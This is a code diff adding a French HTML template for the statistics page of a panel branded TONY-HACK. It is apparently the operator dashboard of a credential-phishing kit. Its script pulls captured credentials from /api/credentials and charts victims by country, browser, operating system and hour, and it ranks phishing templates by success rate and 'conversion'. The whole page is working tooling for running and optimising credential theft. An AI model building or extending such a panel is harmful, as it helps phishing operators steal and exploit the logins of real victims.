@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TONY-HACK | Statistiques</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="sidebar-header"><h2>TONY-HACK</h2></div>
+        <div class="sidebar-user">
+            <div class="avatar"><i class="fas fa-user-shield"></i></div>
+            <div class="user-info"><h4>{{ session.get('user', 'admin') }}</h4><p>Administrateur</p></div>
+        </div>
+        <div class="sidebar-nav">
+            <a href="/" class="nav-item"><i class="fas fa-home"></i><span>Dashboard</span></a>
+            <a href="/campaigns" class="nav-item"><i class="fas fa-bullhorn"></i><span>Campagnes</span></a>
+            <a href="/templates" class="nav-item"><i class="fas fa-file-code"></i><span>Templates</span></a>
+            <a href="/builder" class="nav-item"><i class="fas fa-code"></i><span>Builder</span></a>
+            <a href="/logs" class="nav-item"><i class="fas fa-list"></i><span>Logs</span></a>
+            <a href="/statistics" class="nav-item active"><i class="fas fa-chart-bar"></i><span>Statistiques</span></a>
+            <a href="/settings" class="nav-item"><i class="fas fa-cog"></i><span>Paramètres</span></a>
+            <a href="/profile" class="nav-item"><i class="fas fa-user-circle"></i><span>Profil</span></a>
+        </div>
+        <div class="sidebar-footer">
+            <a href="/logout" class="nav-item" onclick="return confirm('Déconnexion ?')"><i class="fas fa-sign-out-alt"></i><span>Déconnexion</span></a>
+        </div>
+    </div>
+    
+    <div class="main-content">
+        <div class="page-header">
+            <h1 class="page-title">Statistiques <span>Avancées</span></h1>
+            <div class="flex items-center gap-2">
+                <select id="periodFilter" onchange="loadStatistics()" style="width: auto;">
+                    <option value="all">Toutes les périodes</option>
+                    <option value="today">Aujourd'hui</option>
+                    <option value="week">Cette semaine</option>
+                    <option value="month">Ce mois</option>
+                </select>
+                <button class="btn btn-primary" onclick="loadStatistics()">
+                    <i class="fas fa-sync-alt"></i> Actualiser
+                </button>
+            </div>
+        </div>
+        
+        <!-- KPI Cards -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-database"></i></div>
+                <div class="stat-info">
+                    <h3>Total Captures</h3>
+                    <div class="value" id="totalCaptures">{{ stats.total }}</div>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-globe"></i></div>
+                <div class="stat-info">
+                    <h3>IP Uniques</h3>
+                    <div class="value" id="uniqueIPs">{{ stats.unique_ips }}</div>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-flag"></i></div>
+                <div class="stat-info">
+                    <h3>Pays Touchés</h3>
+                    <div class="value" id="countriesCount">0</div>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-chart-line"></i></div>
+                <div class="stat-info">
+                    <h3>Taux de Conversion</h3>
+                    <div class="value" id="conversionRate">0%</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Graphiques -->
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
+            <div class="card">
+                <div class="card-header">
+                    <h3><i class="fas fa-flag"></i> Top Pays</h3>
+                </div>
+                <canvas id="countriesChart" style="height: 250px;"></canvas>
+            </div>
+            
+            <div class="card">
+                <div class="card-header">
+                    <h3><i class="fas fa-globe"></i> Navigateurs</h3>
+                </div>
+                <canvas id="browsersChart" style="height: 250px;"></canvas>
+            </div>
+        </div>
+        
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
+            <div class="card">
+                <div class="card-header">
+                    <h3><i class="fas fa-desktop"></i> Systèmes d'exploitation</h3>
+                </div>
+                <canvas id="osChart" style="height: 250px;"></canvas>
+            </div>
+            
+            <div class="card">
+                <div class="card-header">
+                    <h3><i class="fas fa-clock"></i> Heures de capture</h3>
+                </div>
+                <canvas id="hoursChart" style="height: 250px;"></canvas>
+            </div>
+        </div>
+        
+        <!-- Tableau détaillé par pays -->
+        <div class="card">
+            <div class="card-header">
+                <h3><i class="fas fa-table"></i> Détail par pays</h3>
+            </div>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Pays</th>
+                            <th>Captures</th>
+                            <th>Pourcentage</th>
+                            <th>Progression</th>
+                        </tr>
+                    </thead>
+                    <tbody id="countriesTableBody">
+                        <tr><td colspan="4" style="text-align: center;">Chargement...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        
+        <!-- Top Templates -->
+        <div class="card">
+            <div class="card-header">
+                <h3><i class="fas fa-trophy"></i> Templates les plus performants</h3>
+            </div>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Template</th>
+                            <th>Type</th>
+                            <th>Captures</th>
+                            <th>Taux de réussite</th>
+                        </tr>
+                    </thead>
+                    <tbody id="templatesStatsBody">
+                        <tr><td colspan="4" style="text-align: center;">Chargement...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    
+    <div class="toast-container" id="toastContainer"></div>
+    
+    <script>
+        let charts = {};
+        
+        function showToast(title, message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            let icon = type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle';
+            toast.innerHTML = `<i class="fas fa-${icon}"></i><div class="toast-content"><div class="toast-title">${title}</div><div class="toast-message">${message}</div></div>`;
+            container.appendChild(toast);
+            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 4000);
+        }
+        
+        async function loadStatistics() {
+            try {
+                const response = await fetch('/api/credentials');
+                const data = await response.json();
+                const credentials = data.credentials;
+                
+                processStatistics(credentials);
+            } catch (e) {
+                console.error('Erreur:', e);
+                showToast('Erreur', 'Impossible de charger les statistiques', 'error');
+            }
+        }
+        
+        function processStatistics(credentials) {
+            // Stats par pays
+            const countries = {};
+            const browsers = {};
+            const os = {};
+            const hours = {};
+            const templates = {};
+            
+            credentials.forEach(cred => {
+                // Pays
+                const country = cred.country || 'Inconnu';
+                countries[country] = (countries[country] || 0) + 1;
+                
+                // Navigateur
+                const ua = (cred.user_agent || '').toLowerCase();
+                if (ua.includes('chrome')) browsers['Chrome'] = (browsers['Chrome'] || 0) + 1;
+                else if (ua.includes('firefox')) browsers['Firefox'] = (browsers['Firefox'] || 0) + 1;
+                else if (ua.includes('safari')) browsers['Safari'] = (browsers['Safari'] || 0) + 1;
+                else if (ua.includes('edge')) browsers['Edge'] = (browsers['Edge'] || 0) + 1;
+                else browsers['Autre'] = (browsers['Autre'] || 0) + 1;
+                
+                // OS
+                if (ua.includes('windows')) os['Windows'] = (os['Windows'] || 0) + 1;
+                else if (ua.includes('mac')) os['macOS'] = (os['macOS'] || 0) + 1;
+                else if (ua.includes('linux')) os['Linux'] = (os['Linux'] || 0) + 1;
+                else if (ua.includes('android')) os['Android'] = (os['Android'] || 0) + 1;
+                else if (ua.includes('ios') || ua.includes('iphone')) os['iOS'] = (os['iOS'] || 0) + 1;
+                else os['Autre'] = (os['Autre'] || 0) + 1;
+                
+                // Heure
+                if (cred.timestamp) {
+                    const hour = new Date(cred.timestamp).getHours();
+                    hours[hour] = (hours[hour] || 0) + 1;
+                }
+                
+                // Template
+                const templateName = cred.template_name || 'Inconnu';
+                if (!templates[templateName]) {
+                    templates[templateName] = { captures: 0, type: cred.template_type || 'custom' };
+                }
+                templates[templateName].captures++;
+            });
+            
+            // Mise à jour des KPIs
+            document.getElementById('countriesCount').textContent = Object.keys(countries).length;
+            
+            // Créer les graphiques
+            createCountriesChart(countries);
+            createBrowsersChart(browsers);
+            createOSChart(os);
+            createHoursChart(hours);
+            
+            // Remplir le tableau des pays
+            renderCountriesTable(countries, credentials.length);
+            
+            // Remplir le tableau des templates
+            renderTemplatesTable(templates);
+        }
+        
+        function createCountriesChart(data) {
+            const ctx = document.getElementById('countriesChart').getContext('2d');
+            
+            if (charts.countries) charts.countries.destroy();
+            
+            const sorted = Object.entries(data).sort((a, b) => b[1] - a[1]).slice(0, 10);
+            
+            charts.countries = new Chart(ctx, {
+                type: 'bar',
+                data: {
+                    labels: sorted.map(([name]) => name),
+                    datasets: [{
+                        label: 'Captures',
+                        data: sorted.map(([, value]) => value),
+                        backgroundColor: '#e94560',
+                        borderRadius: 8
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { display: false }
+                    }
+                }
+            });
+        }
+        
+        function createBrowsersChart(data) {
+            const ctx = document.getElementById('browsersChart').getContext('2d');
+            
+            if (charts.browsers) charts.browsers.destroy();
+            
+            charts.browsers = new Chart(ctx, {
+                type: 'doughnut',
+                data: {
+                    labels: Object.keys(data),
+                    datasets: [{
+                        data: Object.values(data),
+                        backgroundColor: ['#e94560', '#1877f2', '#34a853', '#fbbc04', '#8b949e']
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false
+                }
+            });
+        }
+        
+        function createOSChart(data) {
+            const ctx = document.getElementById('osChart').getContext('2d');
+            
+            if (charts.os) charts.os.destroy();
+            
+            charts.os = new Chart(ctx, {
+                type: 'pie',
+                data: {
+                    labels: Object.keys(data),
+                    datasets: [{
+                        data: Object.values(data),
+                        backgroundColor: ['#e94560', '#1877f2', '#34a853', '#fbbc04', '#ea4335', '#8b949e']
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false
+                }
+            });
+        }
+        
+        function createHoursChart(data) {
+            const ctx = document.getElementById('hoursChart').getContext('2d');
+            
+            if (charts.hours) charts.hours.destroy();
+            
+            const hours = Array.from({length: 24}, (_, i) => data[i] || 0);
+            
+            charts.hours = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: Array.from({length: 24}, (_, i) => i + 'h'),
+                    datasets: [{
+                        label: 'Captures',
+                        data: hours,
+                        borderColor: '#e94560',
+                        backgroundColor: 'rgba(233, 69, 96, 0.1)',
+                        fill: true,
+                        tension: 0.4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false
+                }
+            });
+        }
+        
+        function renderCountriesTable(countries, total) {
+            const tbody = document.getElementById('countriesTableBody');
+            
+            const sorted = Object.entries(countries).sort((a, b) => b[1] - a[1]);
+            
+            if (sorted.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Aucune donnée</td></tr>';
+                return;
+            }
+            
+            tbody.innerHTML = sorted.map(([name, count]) => {
+                const percentage = ((count / total) * 100).toFixed(1);
+                return `
+                    <tr>
+                        <td>${name}</td>
+                        <td><strong>${count}</strong></td>
+                        <td>${percentage}%</td>
+                        <td>
+                            <div class="progress" style="width: 100px;">
+                                <div class="progress-bar" style="width: ${percentage}%;"></div>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        }
+        
+        function renderTemplatesTable(templates) {
+            const tbody = document.getElementById('templatesStatsBody');
+            
+            const sorted = Object.entries(templates).sort((a, b) => b[1].captures - a[1].captures);
+            
+            if (sorted.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Aucun template</td></tr>';
+                return;
+            }
+            
+            const total = sorted.reduce((sum, [, data]) => sum + data.captures, 0);
+            
+            tbody.innerHTML = sorted.map(([name, data]) => {
+                const percentage = total > 0 ? ((data.captures / total) * 100).toFixed(1) : 0;
+                return `
+                    <tr>
+                        <td>${name}</td>
+                        <td><span class="badge badge-${data.type}">${data.type}</span></td>
+                        <td><strong>${data.captures}</strong></td>
+                        <td>
+                            <div style="display: flex; align-items: center; gap: 8px;">
+                                <div class="progress" style="flex: 1;">
+                                    <div class="progress-bar" style="width: ${percentage}%;"></div>
+                                </div>
+                                <span>${percentage}%</span>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        }
+        
+        document.addEventListener('DOMContentLoaded', loadStatistics);
+    </script>
+</body>
+</html>
